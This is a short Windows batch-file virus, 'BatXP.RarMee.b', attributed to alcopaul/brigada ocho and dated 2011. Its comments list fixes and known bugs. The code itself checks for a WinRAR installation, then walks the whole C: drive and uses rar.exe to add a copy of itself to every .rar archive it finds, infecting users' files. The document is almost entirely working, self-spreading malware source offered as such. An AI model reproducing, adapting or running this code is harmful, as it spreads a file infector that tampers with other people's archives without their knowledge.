::BatXP.RarMee.b
::alcopaul/brigada ocho
::march 26, 2011

::issues addressed:
::1.) Long filenames with long directory names with space are now handled successfully
::2.) rar.exe doesn't handle zip files anymore (rar version 4.0). *.zip files excluded.
::
::inherent bugs:
::1.) waits for user input if rar file has a password. didn't use -p- switch ("Do not query password")
:: coz it also inserts a passworded (password:"-") batch file inside the rar file.
::
:: tested in windows xp sp3. must be executed by double clicking.
::
:: start virus

::BatXP.RaRMee.b/alcopaul/b8::
@echo off
assoc .rar | cls
if errorlevel==1 goto x
ftype winrar>b.8 | cls
find /i "c:\program files\winrar" b.8 | cls
if errorlevel==1 goto x
for /r c:\ %%b in (*.rar) do "c:\program files\winrar\rar.exe" u "%%b" %0
:x
del b.8
exit cmd.exe

:: end virus
